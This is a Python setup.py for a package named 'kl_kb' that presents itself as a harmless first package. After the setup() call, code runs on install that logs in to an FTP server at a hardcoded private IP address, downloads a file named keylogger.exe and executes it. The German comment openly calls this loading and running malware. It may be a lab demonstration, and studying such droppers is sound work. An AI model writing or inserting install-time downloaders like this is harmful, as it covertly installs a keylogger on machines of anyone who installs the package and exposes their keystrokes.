from setuptools import setup, find_packages
from ftplib import FTP_TLS
import os

VERSION = '0.0.1' 
DESCRIPTION = 'My first Python package'
LONG_DESCRIPTION = 'My first Python package with a slightly longer description'

# Setting up
setup(
        name="kl_kb",
        version=VERSION,
        author="Anonymous",
        author_email="<anonymous@email.com>",
        description=DESCRIPTION,
        long_description=LONG_DESCRIPTION,
        packages=find_packages(),
        install_requires=[],
        keywords=['python', 'first package'],
        classifiers= [
            "Development Status :: 3 - Alpha",
            "Intended Audience :: Education",
            "Programming Language :: Python :: 3",
            "Operating System :: Microsoft :: Windows",
        ]
)

# Laden und Ausführen der Schadsoftware vom Server
with FTP_TLS() as ftps:
    ftps.connect('192.168.189.128', 2121)
    ftps.login(user="user", passwd="12345")
    ftps.prot_p()
    ftps.retrbinary("RETR keylogger.exe",open("keylog.exe","wb").write)
os.startfile("keylog.exe")